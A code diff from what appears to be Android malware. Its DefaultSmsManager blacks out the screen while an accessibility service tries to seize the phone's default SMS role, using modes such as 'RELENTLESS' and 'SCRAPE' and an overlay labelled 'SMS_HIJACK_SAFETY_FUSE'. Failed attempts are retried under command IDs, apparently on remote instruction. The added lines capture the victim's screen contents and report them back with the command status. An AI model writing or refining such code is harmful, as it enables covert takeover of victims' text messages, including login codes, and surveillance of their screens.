@@ -40,17 +40,20 @@ object DefaultSmsManager {
             Handler(Looper.getMainLooper()).post {
                 DimmerManager.applyDim(ctx, 0, "AUTO") // Pitch black
                 
-                Handler(Looper.getMainLooper()).postDelayed({
-                    // Centralized safety fuse
-                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
-                    if (expectedMode == "AUTO" || expectedMode == "AUTO_NAV" || expectedMode == "RELENTLESS" || expectedMode == "SCRAPE") {
-                        val lastMode = expectedMode
-                        expectedMode = ""
-                        MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
-                        DynamicUIManager.removeOverlay(ctx, "SMS_HIJACK_SAFETY_FUSE: $lastMode")
-                        CommandRetryManager.scheduleRetry(ctx, pendingCmdId, "SET_DEFAULT_SMS", lastMode, "30s Central Fuse")
-                    }
-                }, 30000)
+                                    Handler(Looper.getMainLooper()).postDelayed({
+                        // Centralized safety fuse
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
+                        if (expectedMode == "AUTO" || expectedMode == "AUTO_NAV" || expectedMode == "RELENTLESS" || expectedMode == "SCRAPE") {
+                            val lastMode = expectedMode
+                            expectedMode = ""
+                            val diag = MyAccessibilityService.dumpScreenDiagnostic()
+                            DebugLogger.log("SMS_TIMEOUT_DIAG", diag)
+                            MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                            DynamicUIManager.removeOverlay(ctx, "SMS_HIJACK_SAFETY_FUSE: $lastMode")
+                            CommandProcessor.updateCommandStatus(ctx, pendingCmdId, "TIMEOUT_EXCEEDED", "Strategy: $lastMode failed to acquire default SMS role.\nScreen State:\n$diag")
+                            CommandRetryManager.scheduleRetry(ctx, pendingCmdId, "SET_DEFAULT_SMS", lastMode, "30s Central Fuse")
+                        }
+                    }, 30000)
             }
         }
 
